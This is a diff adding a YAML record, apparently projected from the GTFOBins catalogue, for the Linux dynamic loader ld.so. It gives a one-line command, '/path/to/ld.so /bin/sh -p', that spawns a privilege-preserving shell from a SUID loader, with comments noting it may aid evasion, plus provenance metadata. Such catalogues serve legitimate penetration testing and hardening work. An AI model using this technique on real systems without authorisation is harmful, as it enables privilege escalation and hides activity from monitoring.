@@ -1,0 +1,93 @@
+id: gtfobins/ld.so/shell/suid
+type: binary
+platform: linux
+name: ld.so
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: /path/to/ld.so /bin/sh -p
+  comment: The spawned process will be the loader, not the target executable, this might aid evasion.
+    See <https://shyft.us/posts/20230526_linux_command_proxy.html> for more information.
+references:
+- https://gtfobins.github.io/gtfobins/ld.so/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        ld.so:
+          comment: '`ld.so` is the Linux dynamic linker/loader, its filename and location might change
+            across distributions (e.g., `/lib64/ld-linux-x86-64.so.2`). The actual path is can be obtained
+            with:
+
+
+            ```
+
+            strings /proc/self/exe | head -1
+
+            ```'
+          functions:
+            shell:
+            - code: /path/to/ld.so /bin/sh
+              comment: The spawned process will be the loader, not the target executable, this might aid
+                evasion. See <https://shyft.us/posts/20230526_linux_command_proxy.html> for more information.
+              contexts:
+                sudo: null
+                suid:
+                  code: /path/to/ld.so /bin/sh -p
+                  shell: false
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/ld.so/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:6acbea6dfd2d35b7f8d55b079b83b4aa0ec6fbaaed4fa4c32ce4a28acdceeddb
